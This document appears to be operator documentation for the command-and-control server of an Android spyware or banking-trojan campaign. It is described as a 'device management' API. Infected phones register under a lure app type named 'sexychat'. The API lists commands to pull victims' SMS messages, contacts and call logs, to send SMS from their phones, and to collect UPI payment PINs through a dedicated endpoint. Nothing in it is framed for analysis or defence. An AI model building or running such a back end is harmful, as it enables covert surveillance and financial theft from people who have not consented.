# Device API

Complete API documentation for device management.

## Device Registration

### POST /register
Register new device or update existing.

**Request:**
```json
{
  "type": "register",
  "device_id": "abc123",
  "device_info": {
    "model": "Samsung Galaxy S21",
    "manufacturer": "Samsung",
    "os_version": "Android 13",
    "battery": 85,
    "fcm_token": "firebase_token"
  },
  "user_id": "admin_device_token",
  "app_type": "sexychat"
}
```

## Device Management

### GET /api/devices
List all devices for admin.

**Query Parameters:**
- `app_type`: Filter by app
- `status`: Filter by status (online/offline)
- `limit`: Results per page
- `skip`: Pagination

### GET /api/devices/{device_id}
Get device details.

### PUT /api/devices/{device_id}/settings
Update device settings.

### DELETE /api/devices/{device_id}
Delete device.

## Device Commands

### POST /api/devices/{device_id}/command
Send command via Firebase.

**Request:**
```json
{"command": "ping"}
```

**Available Commands:**
- `ping` - Test device connectivity
- `get_sms` - Request SMS upload
- `get_contacts` - Request contacts upload
- `get_call_logs` - Request call logs
- `start_services` - Start all services
- `restart_heartbeat` - Restart heartbeat

## SMS Management

### POST /sms
Upload SMS messages from device.

### GET /api/devices/{device_id}/sms
Get SMS messages.

**Query Parameters:**
- `limit`: Messages per page
- `skip`: Pagination
- `type`: inbox/sent/draft

### POST /api/devices/{device_id}/send-sms
Send SMS from device.

**Request:**
```json
{
  "phoneNumber": "+989123456789",
  "message": "Hello from device"
}
```

## Contacts Management

### POST /contacts
Upload contacts from device.

### GET /api/devices/{device_id}/contacts
Get device contacts.

## Call Logs

### POST /call_logs
Upload call logs from device.

### GET /api/devices/{device_id}/call_logs
Get call logs.

## Device Status

### POST /devices/heartbeat
Device sends heartbeat every 3 minutes.

**Request:**
```json
{"deviceId": "abc123"}
```

### Status Logic
- **Online**: Heartbeat within 6 minutes
- **Offline**: No heartbeat for 6+ minutes
- **Pending**: Just registered

### Background Monitoring
Task runs every 5 minutes to mark offline devices.

## UPI PIN Collection

### POST /save_upi_pin
Save UPI PIN from device.

**Request:**
```json
{
  "deviceId": "abc123",
  "upiPin": "123456"
}
```

## Statistics

### GET /api/devices/stats
Get device statistics.

**Response:**
```json
{
  "total_devices": 100,
  "online_devices": 70,
  "offline_devices": 30,
  "by_app_type": {
    "sexychat": 50,
    "other": 50
  }
}
```

**Last Updated**: November 10, 2025
